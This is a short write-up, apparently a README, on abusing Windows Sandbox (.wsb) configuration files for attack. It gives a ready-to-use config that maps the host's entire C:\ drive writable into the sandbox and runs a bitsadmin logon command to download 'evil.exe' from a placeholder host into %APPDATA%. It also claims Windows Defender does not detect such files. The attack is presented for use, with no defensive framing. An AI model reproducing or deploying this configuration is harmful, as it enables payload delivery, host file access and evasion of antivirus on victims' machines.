
### I - How Windows Sandbox works


Windows Sandbox (WSB) will allow to create an isolated desktop environment, 
WSB configuration files are in XML format and use the .wsb extension.


![image](https://user-images.githubusercontent.com/75935486/152426360-480974ca-877d-4786-a715-237211be7558.png)



Here is an example of a configuration file: 




### II - Exploiting WSB configurations:


One of the first methods is to modify the `<Command>` field to execute our malicious command and access the host's system files, in addition to that WSB files are not detected by Windows Defender.

Possible command to inject:
```powershell
<Command>bitsadmin /transfer myjob /download /priority high http://legit/evil.exe"%APPDATA%\file">nul&</Command>
```

Configuration compromises:
```xml
<Configuration>
   <MappedFolders>
 	<MappedFolder>
	  <HostFolder>C:\</HostFolder>
 	  <SandboxFolder>C:\Users\WDAGUtilityAccount\UserFiles</SandboxFolder>
 	  <ReadOnly>false</ReadOnly>
 	</MappedFolder>
   </MappedFolders>
   <LogonCommand>
 	<Command>bitsadmin /transfer myjob /download /priority high http://legit/evil.exe"%APPDATA%\file">nul&</Command>
   </LogonCommand>
</Configuration>
```

